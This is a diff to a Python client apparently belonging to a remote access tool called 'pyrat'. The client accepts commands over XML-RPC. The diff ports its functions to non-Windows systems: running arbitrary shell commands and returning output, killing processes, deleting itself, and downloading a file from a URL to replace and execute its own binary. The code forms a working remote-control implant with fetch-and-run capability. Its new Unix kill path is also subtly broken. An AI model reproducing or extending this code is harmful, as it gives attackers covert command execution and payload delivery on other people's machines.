@@ -4,11 +4,16 @@
 import xmlrpclib
 import time, subprocess
 import urllib, urllib2
-import os, shutil, sys
+import os, shutil, sys, signal
 import pyratfc
 
+if sys.platform == 'win32':
+    PYRATCLI = 'pyratcli.exe'
+else:
+    PYRATCLI = 'pyratcli'
+
 class XmlCli():
-    PYRAT_CLIENT_VERSION = '0.1.0'
+    PYRAT_CLIENT_VERSION = '0.1.1'
 
     def __init__(self, svr):
         self.cmdmap = {
@@ -76,7 +81,7 @@ class XmlCli():
 
     def uninstall(self, argv):
         try:
-            os.remove("pyratcli.exe")
+            os.remove(PYRATCLI)
             os._exit(0)            
             return (True, "")
         except Exception as e:
@@ -87,9 +92,9 @@ class XmlCli():
             req = urllib.urlopen(url)
             data = req.read()
             self.__write_file('tmp', data)
-            os.remove("pyratcli.exe")
-            shutil.move('tmp', 'pyratcli.exe')
-            cmd = 'pyratcli.exe'
+            os.remove(PYRATCLI)
+            shutil.move('tmp', PYRATCLI)
+            cmd = PYRATCLI
             self.runexec(cmd)
             return (True, '')
         except Exception as e:
@@ -123,11 +128,13 @@ class XmlCli():
     
     def cmdshell(self, cmd):
         try:
-            cmd = 'cmd.exe /c %s &' % cmd
-            log = 'cmd.log'
-            p = subprocess.Popen(cmd, stdout=file(log, 'w'), stderr=subprocess.STDOUT)
-            p.wait()
-            data = self.__read_file(log)
+            #https://www.cnblogs.com/yangykaifa/p/7127776.html
+            # cmd = 'cmd.exe /c %s &' % cmd
+            # log = 'cmd.log'
+            # p = subprocess.Popen(cmd, stdout=file(log, 'w'), stderr=subprocess.STDOUT)
+            # p.wait()
+            # data = self.__read_file(log)
+            data = os.popen(cmd).read()
             return (True, xmlrpclib.Binary(data))
         except Exception as e:
             return (False, str(e))
@@ -142,12 +149,18 @@ class XmlCli():
     def terminate_proc(self, argv):
         try:
             (ptype, val) = argv.split(' ')
-            ptype = '/PID' if ptype == 'pid' else '/IM'
-            cmd = 'cmd.exe /c taskkill %s %s' % (ptype, val)
-            log = 'cmd.log'
-            p = subprocess.Popen(cmd, stdout=file(log, 'w'), stderr=subprocess.STDOUT)
-            p.wait()
-            data = self.__read_file(log)
+            # ptype = '/PID' if ptype == 'pid' else '/IM'
+            # cmd = 'cmd.exe /c taskkill %s %s' % (ptype, val)
+            # log = 'cmd.log'
+            # p = subprocess.Popen(cmd, stdout=file(log, 'w'), stderr=subprocess.STDOUT)
+            # p.wait()
+            # data = self.__read_file(log)
+            # https://www.cnblogs.com/xjh713/p/6306587.html?utm_source=itdadao&utm_medium=referral
+            if sys.platform == 'win32':
+                ptype = '/PID' if ptype == 'pid' else '/IM'
+                data = os.popen('taskkill %s %s' % (ptype, val)).read()
+            else:
+                os.kill(val, signal.SIGKILL)
             return (True, xmlrpclib.Binary(data))
         except Exception as e:
             return (False, str(e))
